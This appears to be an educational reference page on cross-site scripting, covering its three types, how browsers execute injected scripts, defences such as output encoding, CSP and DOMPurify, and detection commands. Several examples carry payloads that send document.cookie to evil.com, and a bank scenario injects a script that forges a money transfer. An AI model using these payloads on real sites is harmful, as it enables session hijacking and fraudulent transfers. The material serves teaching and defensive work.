---
id: SEC-012
title: "Cross-Site Scripting (XSS)"
category: "Security"
tier: tier-2-networking-security
folder: SEC-security
difficulty: ★★☆
depends_on: SEC-001, SEC-004, SEC-010
used_by: SEC-035, SEC-047, SEC-048
related: SEC-001, SEC-004, SEC-010, SEC-011, SEC-035, SEC-047, SEC-048, SEC-022, SEC-024
tags:
  - security
  - xss
  - owasp
  - injection
  - web-security
  - javascript
status: complete
version: 4
layout: default
parent: "Security"
grand_parent: "Technical Mastery"
nav_order: 12
permalink: /technical-mastery/sec/cross-site-scripting-xss/
---

⚡ TL;DR - XSS (Cross-Site Scripting) occurs when an attacker
injects malicious JavaScript into a web page that is then
executed by other users' browsers. The attacker does not
attack the server - they attack other users through the
server. Impact: steal session cookies (account takeover),
keylog user input (credential theft), redirect to phishing
pages, exfiltrate form data, deface pages. Three types:
Reflected (payload in URL, immediate execution), Stored
(payload saved to database, executes for all who view it),
DOM-based (JavaScript reads payload from URL and writes it
to DOM without sanitization). Prevention: output encoding
(HTML-encode all user-controlled content before rendering),
Content Security Policy (CSP, blocks inline scripts), and
framework-level protection (React, Angular auto-escape).
Modern JS frameworks virtually eliminate XSS in their
rendering layer - residual risk: `dangerouslySetInnerHTML`,
`innerHTML`, DOM manipulation with user data.

---

| #012 | Category: Security | Difficulty: ★★☆ |
|:---|:---|:---|
| **Depends on:** | Security Problem, OWASP Top 10, Hashing vs Encryption vs Encoding | |
| **Used by:** | XSS Prevention, CSP, Advanced XSS | |
| **Related:** | OWASP, SQL Injection, CSRF, Input Validation, CSP, Advanced XSS | |

---

### 🔥 The Problem This Solves

**WORLD WITH THE VULNERABILITY:**
Social network allows users to post comments. Comment is
stored in database and displayed to all other users. Attacker
posts:
```html
<script>
  document.location='https://evil.com/steal?cookie='+document.cookie
</script>
```
Every user who loads the page with this comment: their
browser executes the script. Their session cookie is sent to
attacker's server. Attacker uses cookie for session hijacking.
No password needed. This is Stored XSS: the payload persists
in the database and executes for every future visitor.
The British Airways breach (2018, $26M fine): attacker
compromised a third-party JavaScript library, effectively
a Stored XSS via supply chain. 380,000 customers' payment
data captured.

---

### 📘 Textbook Definition

**XSS:** A client-side code injection attack where attacker-
controlled input is rendered as active JavaScript in a victim's
browser context. The browser executes the script with the same
trust level as the legitimate site (same origin).

**Three Types:**

**Reflected XSS (Non-Persistent):**
Payload comes from the current HTTP request (URL parameter,
form field). Not stored. Victim must click a crafted link.
```
URL: https://site.com/search?q=<script>alert('XSS')</script>
Server renders: <div>Results for: <script>alert('XSS')</script></div>
Execution: in victim's browser when they click the link
```

**Stored XSS (Persistent):**
Payload stored in database (comments, profiles, messages).
Executes for every user who views the stored content.
Most severe: affects all users, not just those who click a link.

**DOM-Based XSS:**
The JavaScript code in the page reads data from an
untrusted source (URL hash, document.referrer) and writes
it to the DOM without sanitization. Never touches the server.
```javascript
// Vulnerable: reads URL hash, writes to DOM without encoding
document.getElementById('name').innerHTML = location.hash.slice(1)
// URL: https://site.com/#<img src=x onerror=alert(1)>
```

**Impact:** Session hijacking (steal cookies), credential theft
(keylog form inputs), phishing (redirect to fake login page),
defacement, CSRF (execute requests in victim's browser context),
data exfiltration, malware distribution.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
XSS = attacker injects JavaScript into a web page, victim's
browser executes it with the same trust as the real site,
enabling session theft and account takeover.

**One analogy:**
> A newspaper's comment section that prints reader comments
> verbatim in the print edition. A reader submits a comment:
> "Great article! [execute command: mail all subscribers' 
> addresses to attacker@evil.com]." The printer runs the
> command because they treat all text in the "comments" section
> as content to be executed, not just text to display. The
> browser is the printer. HTML rendering + JavaScript execution
> without output encoding = XSS.

---

### 🔩 First Principles Explanation

**Why browsers execute injected scripts:**

```
BROWSER HTML RENDERING MODEL:
  The browser receives HTML and parses it into a DOM.
  When the parser encounters <script> tags or event handlers
  (onclick="...", onload="..."), it EXECUTES the contained
  JavaScript as code.
  The browser cannot distinguish between:
    (a) Script that the developer intentionally included
    (b) Script that was injected by an attacker through a form/URL

  Example:
    Developer intended: <div>Hello, Alice!</div>
    What server returns: <div>Hello, <script>alert(document.cookie)</script>!</div>
    (because username was stored as "<script>alert(document.cookie)</script>")
  
  The browser parses: div element containing text "Hello, " +
    script element (executes its content) + text "!"
  The script executes in the full security context of the page:
    - Access to document.cookie (session cookies)
    - Access to localStorage (tokens stored client-side)
    - Can make XMLHttpRequest to the site's origin
    - Can read and modify the entire page DOM

WHY THIS IS DANGEROUS:
  JavaScript running in the browser has access to:
  - All cookies for the domain (if not HttpOnly)
  - All input field values (as user types them)
  - The ability to make authenticated requests to the API
    (the browser automatically sends cookies with every request)

THE SAME-ORIGIN POLICY AND XSS:
  Same-Origin Policy: JavaScript from site A cannot access
  resources from site B.
  XSS bypass: the malicious script IS running on site A
  (it was injected into site A's page).
  So it has full same-origin access to site A's cookies,
  localStorage, DOM, and APIs.
  The Same-Origin Policy doesn't protect against XSS -
  it's designed to protect site A from site B's scripts,
  not from scripts injected into site A itself.
```

---

### 🧪 Thought Experiment

**SCENARIO: What an XSS-based account takeover looks like**

```
SETUP:
  Target: a bank's web application
  Vulnerability: "transaction description" field allows HTML
    (displayed in transaction history)
  Victim: Bank customer Alice
  Attacker: Has a bank account too (legitimate user)

STEP 1: Attacker discovers XSS in transaction descriptions
  Attacker sends themselves $0.01 with description:
    <img src=x onerror="fetch('https://evil.com/log?c='+document.cookie)">
  Attacker checks evil.com/log: sees nothing.
  WHY: session cookies are HttpOnly (not accessible to JavaScript).
  Attacker pivots: cookie theft not possible. What else?

STEP 2: Attacker uses XSS for CSRF-equivalent attack
  New payload: send transaction using victim's session.
  Description payload (URL-encoded in real attack):
    <script>
      // Execute a transfer using the victim's active session
      // The browser sends the request WITH the victim's cookies
      fetch('/api/transfer', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          to_account: '9999999',
          amount: 5000
        })
      });
    </script>

STEP 3: Victim views transaction history
  Alice logs in. Views her transaction history.
  Browser renders the description containing the script.
  Script executes: sends $5,000 to attacker's account.
  The request has Alice's session cookie (browser auto-sends).
  Server: sees authenticated request from Alice. Approves transfer.

STEP 4: What would have prevented this
  Stored XSS prevention: output encode the description field
    before rendering (& → &amp;, < → &lt;, > → &gt;, etc.)
    Attacker's script tags rendered as visible text, not executed.
  CSP: Content-Security-Policy: script-src 'self'
    No inline scripts allowed. The injected <script> is blocked.
  HttpOnly cookies: already in place (STEP 1 showed this).
  CSRF tokens: the transfer API requires a CSRF token.
    The XSS payload does not have the CSRF token and would need
    another request to retrieve it. Additional friction for attacker.
```

---

### 🧠 Mental Model / Analogy

> XSS is like an attacker writing a message on a note in your
> inbox. The note looks like it's from your trusted bank (it's
> in your bank's app). It says "click here to approve a transfer."
> Because it's in your bank's context (same origin), your browser
> treats it as trustworthy and executes the contained JavaScript.
> Output encoding is like requiring that all content in the inbox
> is read as plain text, not as instructions. Even if the attacker
> writes HTML tags - they appear as the literal characters
> `&lt;script&gt;`, not as executable code.

---

### 📶 Gradual Depth - Five Levels

**Level 1 - What it is (anyone can understand):**
XSS lets an attacker sneak JavaScript code into a website.
When other people visit that page, their browser runs the
attacker's code. This can steal their login session or
send money from their account without them knowing.

**Level 2 - How to use it (junior developer):**
Never insert user-controlled data into HTML without encoding
it first. Use your framework's built-in escaping: React's
JSX automatically escapes, Angular's {{ }} templates escape
by default, Jinja2's `{{ variable }}` auto-escapes (not `{{}}`
with `| safe` filter). Never use `.innerHTML = user_input` -
use `.textContent = user_input` (text, not HTML).

**Level 3 - How it works (mid-level engineer):**
Five contexts where XSS can occur, each needing different encoding:
HTML body: `&lt;script&gt;` prevents tag injection.
HTML attribute: `user input` → `user&#x20;input` (attribute encoding).
JavaScript context: user data inside `<script>`: JSON encode,
never string concat. URL: `%3Cscript%3E` (URL encoding).
CSS: `color: red; } ... {` style injection. Each context
has different "special" characters that need escaping.
OWASP XSS Prevention Cheat Sheet: rule-by-rule guidance per context.

**Level 4 - Why it was designed this way (senior/staff):**
XSS is fundamentally a consequence of mixing code and data in
HTML. HTML was originally designed as a document format - there
was no JavaScript. When JavaScript was added (1995), the decision
to embed it in HTML (`<script>` tags, event handlers in attributes)
created the XSS attack surface. Every place where user content
could contain HTML or JavaScript syntax became a potential injection
point. Modern frameworks (React, Angular, Vue) address this at
the framework level: by default, all variable interpolation
produces text nodes (not HTML), requiring explicit opt-in
(dangerouslySetInnerHTML in React) to render HTML. This
"secure by default" design has dramatically reduced XSS in
framework-based applications. Residual risks: third-party
scripts, legacy code using direct DOM manipulation, server-side
rendered templates with missing escaping.

**Level 5 - Mastery (distinguished engineer):**
DOM-based XSS remains the hardest to prevent because it never
reaches the server - the vulnerability is entirely in client-side
JavaScript. Source-sink analysis: sources are where untrusted data
enters JavaScript (location.hash, location.search, document.referrer,
postMessage, WebSockets), sinks are where data is executed
(innerHTML, eval, document.write, setTimeout with string, element.src).
Tracing data flow from sources to sinks in a large SPA is complex.
Tools: DOM Invader (Burp Suite), Semgrep DOM-XSS rules, manual
code review. CSP is the best defense: `script-src 'self'` blocks
all inline script execution (though `'unsafe-inline'` in CSP
negates this protection). Trusted Types (Chrome API): requires
explicit conversion to a "trusted" type before injecting into
DOM sinks - makes DOM XSS auditable at the type system level.

---

### ⚙️ How It Works (Mechanism)

**XSS payload execution flow:**

```
STORED XSS EXECUTION FLOW:

1. ATTACKER submits payload:
   POST /api/comments
   {"text": "<script>document.location='https://evil.com/c?='+document.cookie</script>"}

2. SERVER stores in database (unsanitized):
   INSERT INTO comments (text) VALUES ("<script>...</script>")

3. VICTIM visits page:
   Browser requests: GET /posts/123
   Server queries: SELECT * FROM comments WHERE post_id = 123
   Server renders template: "<div class='comment'>" + comment.text + "</div>"
   Server returns to browser:
     <div class='comment'>
       <script>document.location='https://evil.com/c?='+document.cookie</script>
     </div>

4. VICTIM'S BROWSER parses HTML:
   Encounters <script> element → executes the JavaScript
   JavaScript: redirects browser to evil.com with cookie value
   
5. ATTACKER receives session cookie at evil.com:
   Attacker uses cookie to make authenticated API requests as victim
   → Full account takeover

PREVENTION - OUTPUT ENCODING:
   Server renders template: "<div class='comment'>" + htmlEncode(comment.text) + "</div>"
   htmlEncode transforms: < → &lt;, > → &gt;, & → &amp;, " → &quot;
   Browser receives:
     <div class='comment'>
       &lt;script&gt;document.location=...&lt;/script&gt;
     </div>
   Browser renders: the literal text <script>... is displayed on page
   No JavaScript is executed. Attack prevented.
```

---

### 💻 Code Example

**XSS vulnerabilities and fixes in common frameworks:**

```python
# Python / Jinja2 Template (server-side rendering)

# BAD: Using 'safe' filter with user content
# Jinja2 auto-escapes by default BUT 'safe' filter disables it
# Template: {{ user_comment | safe }}
# This renders user_comment as raw HTML → XSS

# GOOD: Default Jinja2 behavior (auto-escape)
# Template: {{ user_comment }}
# Jinja2 encodes: < → &lt;, > → &gt;, etc. Safe.
```

```javascript
// JavaScript DOM manipulation

// BAD: innerHTML with user data → XSS
const userName = getParameterFromURL('name')
document.getElementById('greeting').innerHTML = 'Hello, ' + userName
// URL: /?name=<img src=x onerror=alert(document.cookie)>
// Executes the onerror event handler → XSS

// GOOD: textContent (treats as text, not HTML)
const userName = getParameterFromURL('name')
document.getElementById('greeting').textContent = 'Hello, ' + userName
// Even if userName contains HTML: rendered as literal text

// BAD: React dangerouslySetInnerHTML with user data
function Comment({ userContent }) {
  // VULNERABLE: rendering user HTML directly
  return <div dangerouslySetInnerHTML={{__html: userContent}} />
}

// GOOD: React default JSX (auto-escapes) + DOMPurify if HTML needed
import DOMPurify from 'dompurify'

function Comment({ userContent }) {
  // Safe: React JSX auto-escapes
  return <div>{userContent}</div>
}

// If user-generated HTML is required (rich text editor):
function RichComment({ userHtmlContent }) {
  const clean = DOMPurify.sanitize(userHtmlContent, {
    ALLOWED_TAGS: ['p', 'strong', 'em', 'a'],
    ALLOWED_ATTR: ['href']
  })
  return <div dangerouslySetInnerHTML={{__html: clean}} />
}
```

```http
# Content Security Policy header (most powerful XSS defense)
# Add to all HTTP responses:
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  object-src 'none';
  base-uri 'self'

# Effect: browser blocks any script not from 'self' or trusted-cdn.com
# An injected <script>alert(1)</script> is blocked by CSP
# even if server returns it (defense-in-depth)
```

---

### ⚖️ Comparison Table

| XSS Type | Persistence | Who Is Affected | Difficulty to Exploit | Detection |
|:---|:---|:---|:---|:---|
| **Reflected** | None (per-request) | Only users who click crafted URL | Medium (requires social engineering) | Easier (payload in URL/request) |
| **Stored** | Database | ALL users who view infected content | Lower (once stored) | Harder (payload in database) |
| **DOM-based** | None (per-request) | Users with crafted URL | Medium | Hardest (never reaches server) |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|:---|:---|
| React/Angular protect against all XSS | Modern JS frameworks auto-escape in their template rendering layer. This prevents most common XSS. But: `dangerouslySetInnerHTML` (React) and `[innerHTML]` (Angular) bypass this protection entirely. DOM manipulation outside the framework (vanilla `document.getElementById().innerHTML = data`) is also unprotected. The framework protects its rendering path, not all JavaScript DOM operations. A React app can still have DOM-based XSS if it reads URL parameters and directly writes them to the DOM. |
| OWASP says to sanitize input to prevent XSS | Input sanitization (removing `<script>` tags on the way in) is insufficient. Attackers bypass with: `<img src=x onerror=payload>`, obfuscated tags, encoded characters. The correct primary defense is OUTPUT ENCODING (encode on the way out). You do not need to restrict what users can input - you need to ensure that when you display it, special characters are rendered as text, not HTML. "Sanitize on input, encode on output" - both matter, but encoding on output is the security control. |

---

### 🚨 Failure Modes & Diagnosis

**Finding XSS vulnerabilities in existing code:**

```bash
# SAST: Semgreg rule for detecting XSS-prone patterns
# (run in CI/CD to catch on every PR)

# Pattern: innerHTML with variable
semgreg --pattern "document.getElementById($X).innerHTML = $Y" \
        --lang javascript ./src

# Pattern: dangerouslySetInnerHTML with variable
semgrep --pattern "dangerouslySetInnerHTML={{__html: $X}}" \
        --lang jsx ./src

# Django template: raw filter (bypasses auto-escape)
grep -rn "| safe\|mark_safe(" ./templates/

# Quick manual test: inject a benign XSS probe
# Send: name=<b>test</b>
# If response renders text in bold: HTML injection possible
# If response shows literal <b>test</b>: properly encoded

# Test stored XSS: submit the probe in every text input field
# Load the page that would display the input
# Check if text is bold (HTML rendered) or shows angle brackets (escaped)
```

---

### 🔗 Related Keywords

**Prerequisites:**
- `OWASP Top 10` - XSS is in A03 Injection
- `Same-Origin Policy` - what XSS bypasses

**Builds on this:**
- `XSS Prevention` - complete mitigation guide
- `Content Security Policy (CSP)` - browser-level XSS defense
- `Advanced XSS Attacks` - mutation XSS, bypasses
- `CSRF` - XSS enables bypassing CSRF tokens

---

### 📌 Quick Reference Card

```
┌──────────────────────────────────────────────────────────┐
│ THREE TYPES  │ Reflected (URL), Stored (DB), DOM-based   │
│              │ Stored is worst (affects all viewers)     │
├──────────────┼───────────────────────────────────────────┤
│ FIX          │ Output encode: < → &lt;, > → &gt;, etc.  │
│              │ CSP: block inline scripts                 │
│              │ Framework default: React/Angular auto-esc │
├──────────────┼───────────────────────────────────────────┤
│ OWASP        │ A03:2021 Injection (previously A07)       │
├──────────────┼───────────────────────────────────────────┤
│ IMPACT       │ Session hijack, credential theft, CSRF,  │
│              │ phishing, defacement                      │
├──────────────┼───────────────────────────────────────────┤
│ DANGEROUS    │ innerHTML, dangerouslySetInnerHTML,       │
│ SINKS        │ document.write, eval, [innerHTML]         │
├──────────────┼───────────────────────────────────────────┤
│ ONE-LINER    │ "Input becomes code because browser       │
│              │  executes HTML. Encode output so it's    │
│              │  always text, never executable HTML."    │
└──────────────────────────────────────────────────────────┘
```

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
"Never trust user data as executable code in any language."
XSS is HTML/JavaScript injection. SQL injection is SQL injection.
Template injection is template language injection. Command
injection is shell command injection. The pattern is identical
in each: user data enters a context where it is interpreted
as code. The fix is always the same: use the context-appropriate
encoding/parameterization to ensure user data is treated as data,
not code. In web development, there are five major injection
contexts (HTML, JavaScript, URL, CSS, HTTP headers) and each
requires context-specific encoding. OWASP's XSS Prevention
Cheat Sheet documents the encoding rule for each context.

---

### 💡 The Surprising Truth

CSP (Content Security Policy) is the most underutilized XSS
defense in production applications. A properly configured CSP
header (`script-src 'self'`) makes stored and reflected XSS
completely harmless - the browser simply refuses to execute
any script not from the site's own origin. But: only 4.5%
of the Alexa Top 1 Million websites have a CSP header (2023
HTTP Archive data). Why? CSP can break legitimate functionality
(third-party scripts, inline JavaScript). Getting CSP right
requires a full audit of every script source. The engineering
response: deploy CSP in report-only mode first (`Content-Security-
Policy-Report-Only: ...`) to collect violations without breaking
anything, fix the violations, then switch to enforcement mode.
CSP does not require perfect initial deployment - it can be
incrementally tightened. A weak CSP is much better than no CSP.

---

### ✅ Mastery Checklist

**You've mastered this when you can:**
1. **IDENTIFY** the three XSS types and explain which is most
   dangerous (Stored: all viewers affected) and why.
2. **IDENTIFY** dangerous DOM sinks in JavaScript code:
   `innerHTML`, `document.write`, `eval`, `dangerouslySetInnerHTML`.
3. **IMPLEMENT** output encoding and explain why it prevents XSS
   (user data rendered as text nodes, not HTML/script elements).
4. **WRITE** a basic CSP header that blocks inline scripts
   and explain what attack it prevents.

---

### 🎯 Interview Deep-Dive

**Q: What is XSS, what are its types, and how do you prevent it?**

*Why they ask:* XSS is one of the most common web vulnerabilities.
Tests whether the developer understands client-side security.

*Strong answer includes:*
- Define: attacker injects JavaScript that executes in victim's
  browser. Same-origin context = access to cookies, localStorage,
  DOM, API requests.
- Types: Reflected (in URL, needs victim to click crafted link),
  Stored (in database, executes for all viewers - most dangerous),
  DOM-based (in client-side JavaScript, never hits server).
- Prevention layers:
  Primary: output encoding (encode on the way out: `<` → `&lt;`).
  Framework: React/Angular auto-escape by default.
  Browser: CSP header blocks inline scripts.
  Cookies: HttpOnly flag prevents cookie theft via XSS.
  DOM: use textContent instead of innerHTML.
- Real example: React's `dangerouslySetInnerHTML` is the most
  common XSS source in React apps. Whenever used: DOMPurify
  sanitization is required before setting.
- Breadth: mention that modern frameworks prevent most XSS
  but DOM manipulation and server-side rendering without
  auto-escape remain risky in large codebases.
